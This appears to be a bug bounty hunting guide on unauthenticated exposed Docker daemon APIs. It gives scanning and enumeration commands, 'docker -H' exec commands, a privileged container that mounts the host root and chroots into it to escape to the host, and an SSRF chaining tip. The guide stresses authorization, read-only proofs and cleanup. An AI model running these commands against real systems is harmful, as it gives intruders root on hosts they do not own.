# Docker API Unauthorized RCE (Exposed docker.sock / docker daemon)

Docker is an open-source platform for building, shipping, and running distributed applications. The Docker daemon (`dockerd`) exposes an API used to remotely control containers; by default it listens on the Unix socket `/var/run/docker.sock`, but when bound to a public interface **with no authentication** anyone can enumerate, create, and exec into containers. This is a Critical finding: full control of the container platform usually means root on the host (mount the host filesystem and escape).

## Hunting Checklist

1. Scan for the daemon ports — remote API defaults to **2375** (unencrypted) / **2376** (TLS):

```bash
nmap -Pn -p 2375 <IP>
nmap -sV -p 2375,2376 <IP>
nmap -p- <IP>        # full scan when the port may be moved
```

2. Confirm it's Docker — request the root or `/version` and read the JSON:

```http
GET /version HTTP/1.1
Host: <IP>:2375
```

Typical confirmations: a `{"message":"page not found"}`-style JSON response, and `/version` returning `ApiVersion`, `KernelVersion`, `OSType`, etc.

3. Enumerate the platform via the API or the docker CLI.
4. Verify the severity with a *read-only* PoC first (`info`, `ps`); only run a container if scope allows, and clean it up immediately.
5. Also hunt non-port-80 web exposure of the same API (`https://<IP>:2375/...`) and check whether the target is in your bug bounty scope (cloud IPs may belong to the provider, not the program — confirm ownership before reporting).

## Test Cases & Examples

CLI against the exposed daemon:

```bash
# All information about the docker host/daemon
docker -H <IP>:2375 info

# List running containers
docker -H <IP>:2375 ps

# List all (including stopped) containers
docker -H <IP>:2375 ps -a

# Exec into a container -> RCE inside it
docker -H <IP>:2375 exec -it <container_name> /bin/bash
```

Raw API equivalents (`curl` works because the API is plain HTTP + JSON):

```bash
curl -s http://<IP>:2375/version
curl -s http://<IP>:2375/containers/json
curl -s http://<IP>:2375/images/json
```

Illustrative escalation (only where explicitly authorized): launching a privileged container that mounts the host root:

```bash
docker -H <IP>:2375 run -v /:/host --rm -it alpine chroot /host sh
```

## Bypass Techniques

- If **2376 (TLS)** is open but you have no client cert, the daemon may still accept unencrypted requests on 2375, or be misconfigured (`--tlsverify` missing) — test both.
- Some deployments proxy the API behind HTTP on 80/8080 or a path rewrite; fuzz for `/containers/json` on ordinary web ports.
- IPv6/internal exposure: if a request from the outside is filtered, the API may still bind `0.0.0.0` internally — chain with SSRF to `http://127.0.0.1:2375/`.

## Tools & Resources

- `docker` CLI with `-H`, `nmap`, `curl`
- [Docker daemon security docs](https://docs.docker.com/engine/security/) — official background on `docker.sock` vs TCP binding and TLS requirements
- Docker API reference: `GET /version`, `/containers/json`, `/exec`, etc. (standard daemon endpoints)

## Report Tips

- Frame impact precisely: unauthenticated remote API = full container control; demonstrate host-root risk with one benign read (`/version`, `info`) rather than leaving shells around.
- Include a cleanup note (containers/images you created were removed) — triage teams check for persistence.
- If the IP is cloud-provider infrastructure, confirm ownership/scope before reporting to avoid invalid "external system" closures.

## Contributor

[N3T_hunt3r](https://twitter.com/N3T_hunt3r)
